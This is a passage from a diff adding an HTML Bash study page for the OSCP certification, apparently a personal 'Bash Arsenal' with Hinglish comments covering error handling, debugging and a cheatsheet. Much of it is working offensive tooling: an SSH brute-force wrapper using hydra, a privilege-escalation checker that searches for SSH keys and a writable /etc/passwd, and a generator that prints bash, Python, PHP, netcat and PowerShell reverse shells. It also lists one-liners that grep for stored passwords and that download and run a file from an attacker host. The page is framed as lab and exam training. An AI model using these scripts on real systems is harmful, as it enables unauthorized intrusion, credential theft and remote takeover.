+ls -la "$OUTDIR/"</pre>
+  </div>
+
+  <div class="hack-script">
+    <div class="hack-script-label">SCRIPT 2 — PING SWEEP</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># Usage: ./sweep.sh 192.168.1</span>
+
+SUBNET=${1:-"192.168.1"}
+ALIVE=()
+
+echo -e "\e[32m[*] Sweeping $SUBNET.0/24...\e[0m"
+
+<span class="kw">for</span> host <span class="kw">in</span> {1..254}; <span class="kw">do</span>
+    ip="$SUBNET.$host"
+    ping -c1 -W1 $ip &>/dev/null && {
+        echo -e "\e[32m[+]\e[0m $ip is ALIVE"
+        ALIVE+=($ip)
+    } &
+<span class="kw">done</span>
+
+wait
+
+echo ""
+echo -e "\e[33m[*] Total alive: ${#ALIVE[@]}\e[0m"
+printf '%s\n' "${ALIVE[@]}" > alive_hosts.txt
+echo "[*] Saved to alive_hosts.txt"</pre>
+  </div>
+
+  <div class="hack-script">
+    <div class="hack-script-label">SCRIPT 3 — SSH BRUTE FORCE WRAPPER</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># Usage: ./ssh_brute.sh 10.10.10.10 userlist.txt /usr/share/wordlists/rockyou.txt</span>
+
+TARGET=$1
+USERS=$2
+PASSLIST=$3
+
+[ $# -lt 3 ] && { echo "Usage: $0 &lt;ip&gt; &lt;users&gt; &lt;passwords&gt;"; exit 1; }
+
+echo -e "\e[36m[*] SSH Brute Force on $TARGET\e[0m"
+echo -e "\e[33m[*] Using hydra...\e[0m"
+
+hydra -L "$USERS" -P "$PASSLIST" ssh://$TARGET \
+    -t 4 -V -o "ssh_creds_$TARGET.txt" 2>/dev/null
+
+<span class="kw">if</span> [ -s "ssh_creds_$TARGET.txt" ]; <span class="kw">then</span>
+    echo -e "\e[32m[+] Credentials found!\e[0m"
+    grep "login:" "ssh_creds_$TARGET.txt"
+<span class="kw">else</span>
+    echo -e "\e[31m[-] No credentials found\e[0m"
+<span class="kw">fi</span></pre>
+  </div>
+
+  <div class="hack-script">
+    <div class="hack-script-label">SCRIPT 4 — PRIV ESC CHECKER</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># Quick manual privilege escalation checks</span>
+
+echo -e "\e[32m╔═══════════════════════════════╗"
+echo -e "║   PRIVESC CHECKER — KARAN    ║"
+echo -e "╚═══════════════════════════════╝\e[0m"
+
+<span class="fn">check</span>() { echo -e "\n\e[33m━━━ $1 ━━━\e[0m"; }
+<span class="fn">found</span>() { echo -e "\e[32m[+] $1\e[0m"; }
+<span class="fn">miss</span>()  { echo -e "\e[31m[-] $1\e[0m"; }
+
+check "CURRENT USER"
+id; whoami
+
+check "SUDO RIGHTS"
+sudo -l 2>/dev/null || miss "No sudo access"
+
+check "SUID FILES"
+find / -perm -4000 -type f 2>/dev/null | while read f; do
+    found "SUID: $f"
+done
+
+check "WRITABLE /ETC"
+find /etc -writable -type f 2>/dev/null | while read f; do
+    found "WRITABLE: $f"
+done
+
+check "CRON JOBS"
+cat /etc/crontab 2>/dev/null
+ls /etc/cron.d/ 2>/dev/null
+
+check "WORLD-WRITABLE DIRS"
+find / -type d -perm -0002 2>/dev/null | grep -v proc
+
+check "/ETC/PASSWD WRITABLE?"
+[ -w /etc/passwd ] && found "YES! /etc/passwd is WRITABLE → add root user!" || miss "/etc/passwd not writable"
+
+check "SSH KEYS"
+find / -name "id_rsa*" 2>/dev/null | while read k; do found "Key: $k"; done
+find / -name "authorized_keys" 2>/dev/null | while read k; do found "AuthKey: $k"; done
+
+check "INTERESTING FILES"
+find / -name "*.conf" -o -name "*.config" -o -name "*.bak" \
+    -o -name "*.old" -o -name "*.db" -o -name "*.sqlite" \
+    2>/dev/null | grep -v proc | head -20
+
+check "NETWORK INFO"
+ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
+
+echo -e "\n\e[32m[*] Check complete!\e[0m"</pre>
+  </div>
+
+  <div class="hack-script">
+    <div class="hack-script-label">SCRIPT 5 — REVERSE SHELL GENERATOR</div>
+    <pre><span class="kw">#!/bin/bash</span>
+<span class="cmt"># Usage: ./revshell.sh 10.10.14.1 4444</span>
+
+LHOST=${1:-"10.10.14.1"}
+LPORT=${2:-"4444"}
+
+echo -e "\e[32m[*] Reverse Shell Generator\e[0m"
+echo -e "\e[33m[*] LHOST: $LHOST | LPORT: $LPORT\e[0m"
+echo ""
+
+echo -e "\e[36m━━━ BASH ━━━\e[0m"
+echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
+
+echo -e "\n\e[36m━━━ PYTHON3 ━━━\e[0m"
+echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+
+echo -e "\n\e[36m━━━ PHP ━━━\e[0m"
+echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+
+echo -e "\n\e[36m━━━ NETCAT ━━━\e[0m"
+echo "nc -e /bin/bash $LHOST $LPORT"
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"
+
+echo -e "\n\e[36m━━━ POWERSHELL ━━━\e[0m"
+echo "\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+
+echo -e "\n\e[33m[*] Listener: nc -lvnp $LPORT\e[0m"</pre>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 11: ERRORS/DEBUG ============================= -->
+<div class="tab-content" id="t11">
+
+  <div class="section green">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title green">🚨 Error Handling</div>
+
+    <div class="two-col">
+      <div>
+        <h3>Exit Codes</h3>
+        <pre><span class="cmt"># 0 = success, non-0 = error</span>
+command
+echo "Exit: $?"   <span class="cmt"># last exit code</span>
+
+<span class="cmt"># Set exit code</span>
+exit 0   <span class="cmt"># success</span>
+exit 1   <span class="cmt"># general error</span>
+exit 2   <span class="cmt"># misuse</span>
+
+<span class="cmt"># Check command success</span>
+ls /etc/passwd
+<span class="kw">if</span> [ $? <span class="op">-eq</span> 0 ]; <span class="kw">then</span>
+    echo "success"
+<span class="kw">fi</span>
+
+<span class="cmt"># Shorthand</span>
+ls /etc/passwd && echo "OK"
+ls /nonexistent || echo "FAIL"</pre>
+      </div>
+      <div>
+        <h3>set Options</h3>
+        <pre><span class="cmt"># Strict mode — ek bhi error pe stop</span>
+set -e          <span class="cmt"># exit on error</span>
+set -u          <span class="cmt"># undefined var = error</span>
+set -o pipefail <span class="cmt"># pipe error catch</span>
+set -euo pipefail <span class="cmt"># sab ek saath (recommended)</span>
+
+<span class="cmt"># Debug mode</span>
+set -x          <span class="cmt"># har command print karo</span>
+set +x          <span class="cmt"># debug off</span>
+
+<span class="cmt"># Script start mein lagao</span>
+<span class="kw">#!/bin/bash</span>
+set -euo pipefail</pre>
+      </div>
+    </div>
+
+    <h3>Custom Error Handler</h3>
+    <pre><span class="kw">#!/bin/bash</span>
+set -euo pipefail
+
+<span class="fn">die</span>() {
+    echo -e "\e[31m[FATAL]\e[0m $1" >&2
+    exit ${2:-1}
+}
+
+<span class="fn">require_tool</span>() {
+    <span class="kw">if</span> ! command -v "$1" &>/dev/null; <span class="kw">then</span>
+        die <span class="str">"$1 install nahi hai! apt install $1"</span>
+    <span class="kw">fi</span>
+    echo -e "\e[32m[+]\e[0m $1 found: $(which $1)"
+}
+
+<span class="cmt"># Use karo</span>
+require_tool nmap
+require_tool gobuster
+require_tool hydra</pre>
+  </div>
+
+  <div class="section blue">
+    <span class="level-badge lv2">LEVEL 2</span>
+    <div class="section-title blue">🔎 Debugging Tips</div>
+    <pre><span class="cmt"># Method 1: Script ke saath</span>
+bash -x script.sh           <span class="cmt"># debug mode</span>
+bash -n script.sh           <span class="cmt"># syntax check only</span>
+bash -v script.sh           <span class="cmt"># verbose</span>
+
+<span class="cmt"># Method 2: Script mein</span>
+set -x                      <span class="cmt"># debug on</span>
+<span class="cmt"># code...</span>
+set +x                      <span class="cmt"># debug off</span>
+
+<span class="cmt"># Method 3: Echo debug</span>
+DEBUG=true
+[ "$DEBUG" = true ] && echo "[DEBUG] var=$var"
+
+<span class="cmt"># Log to file</span>
+exec 2>error.log           <span class="cmt"># stderr file mein</span>
+exec 1>output.log          <span class="cmt"># stdout file mein</span>
+exec 1&gt;/dev/tty            <span class="cmt"># screen wapas</span>
+
+<span class="cmt"># Shellcheck install karo (syntax checker)</span>
+apt install shellcheck
+shellcheck script.sh</pre>
+
+    <div class="info-box info-tip">
+      <strong>💡 COMMON MISTAKES</strong>
+      <ul style="margin-top:6px; color:#aaa;">
+        <li>Variable ke pehle $ bhool gaya</li>
+        <li>= ke aas paas space diya (a = 1 wrong, a=1 right)</li>
+        <li>[ aur ] ke andar space bhool gaya</li>
+        <li>Single quotes mein variable expand nahi hota</li>
+        <li>File path mein spaces — <code>quotes</code> use karo</li>
+      </ul>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================= TAB 12: CHEATSHEET ============================= -->
+<div class="tab-content" id="t12">
+
+  <div class="section green">
+    <div class="section-title green">⚡ BASH QUICK CHEATSHEET — OSCP READY</div>
+
+    <h3>🔵 Variables & Strings</h3>
+    <pre>var="value"              <span class="cmt"># assign</span>
+echo $var / ${var}       <span class="cmt"># use</span>
+${#var}                  <span class="cmt"># length</span>
+${var^^} / ${var,,}      <span class="cmt"># UPPER / lower</span>
+${var:0:5}               <span class="cmt"># substring (start, len)</span>
+${var/old/new}           <span class="cmt"># replace first</span>
+${var:-default}          <span class="cmt"># default if empty</span>
+$1 $2 $@ $#              <span class="cmt"># script args</span>
+$? $$ $!                 <span class="cmt"># exit code, PID, bg PID</span></pre>
+
+    <h3>🔵 Conditions</h3>
+    <pre>[ -f file ]   [ -d dir ]   [ -e path ]  <span class="cmt"># file tests</span>
+[ -r ]  [ -w ]  [ -x ]  [ -s ]          <span class="cmt"># perms, size</span>
+[ -z str ]  [ -n str ]                  <span class="cmt"># empty, non-empty</span>
+[ $a -eq $b ]  [ $a -ne $b ]            <span class="cmt"># number compare</span>
+[ $a -lt $b ]  [ $a -gt $b ]            <span class="cmt"># less, greater</span>
+[[ $a == $b ]]  [[ $a != $b ]]         <span class="cmt"># string</span>
+[[ $a && $b ]]  [[ $a || $b ]]         <span class="cmt"># and, or</span></pre>
+
+    <h3>🔵 Loops</h3>
+    <pre>for i in {1..10}; do ... done           <span class="cmt"># range</span>
+for ((i=0;i<10;i++)); do ... done       <span class="cmt"># C-style</span>
+for f in *.txt; do ... done             <span class="cmt"># files</span>
+while [ cond ]; do ... done             <span class="cmt"># while</span>
+while IFS= read -r line; do ... done < f  <span class="cmt"># file loop</span>
+break / continue                        <span class="cmt"># control</span></pre>
+
+    <h3>🔵 Functions</h3>
+    <pre>func() { commands; return 0; }
+func                    <span class="cmt"># call</span>
+func arg1 arg2          <span class="cmt"># with args</span>
+local var=val           <span class="cmt"># local variable</span>
+result=$(func)          <span class="cmt"># capture output</span></pre>
+
+    <h3>🔵 I/O</h3>
+    <pre>echo "text"             read -p "msg: " var
+echo -e "\e[32mGREEN\e[0m"
+command > file          <span class="cmt"># stdout to file</span>
+command >> file         <span class="cmt"># append</span>
+command 2> err          <span class="cmt"># stderr</span>
+command &>/dev/null     <span class="cmt"># discard all</span>
+cmd1 | cmd2             <span class="cmt"># pipe</span>
+cmd1 && cmd2            <span class="cmt"># if success</span>
+cmd1 || cmd2            <span class="cmt"># if fail</span></pre>
+
+    <h3>🔵 Text Processing</h3>
+    <pre>grep "pat" file         grep -r -i -v -n -E -A3 -B3
+sed 's/old/new/g' f     sed -i (in-place)
+awk '{print $1}' f      awk -F: '{print $3}'
+cut -d: -f1 file        sort -n -r -u   uniq -c   wc -l</pre>
+
+    <h3>🔵 Hacking One-Liners</h3>
+    <pre><span class="cmt"># Port check (pure bash)</span>
+timeout 1 bash -c "echo >/dev/tcp/IP/PORT" 2>/dev/null && echo "OPEN"
+
+<span class="cmt"># Ping sweep</span>
+for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "$i UP" & done; wait
+
+<span class="cmt"># Find SUID</span>
+find / -perm -4000 2>/dev/null
+
+<span class="cmt"># Find writable</span>
+find / -writable -type f 2>/dev/null | grep -v proc
+
+<span class="cmt"># Creds in files</span>
+grep -r "password\|passwd\|secret" /var/www/ 2>/dev/null
+
+<span class="cmt"># Users with shells</span>
+awk -F: '$7 ~ /bash|sh/' /etc/passwd
+
+<span class="cmt"># World writable dirs</span>
+find / -type d -perm -o+w 2>/dev/null
+
+<span class="cmt"># File transfer one-liner</span>
+curl http://LHOST:8000/file -o /tmp/file && chmod +x /tmp/file && /tmp/file</pre>
+
+    <div class="info-box info-tip">
+      <strong>🎯 OSCP BASH WORKFLOW</strong>
+      1. recon.sh → 2. gobuster → 3. privesc_check.sh → 4. find flags → 5. document karo
+    </div>
+  </div>
+
+</div>
+</div>
+
+<footer>
+  ⚡ <strong style="color:#00ff88">Karan's OSCP Bash Arsenal</strong> — Zero to Red Teamer | Practice → HTB → OSCP 🔴
+</footer>
+
+<script>
+function showTab(id, btn) {
+  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function toggleQuiz(header) {
+  const body = header.nextElementSibling;
+  const arrow = header.querySelector('span');
+  body.classList.toggle('open');
+  arrow.textContent = body.classList.contains('open') ? '▲' : '▼';
+}
+</script>
+</body>
+</html>
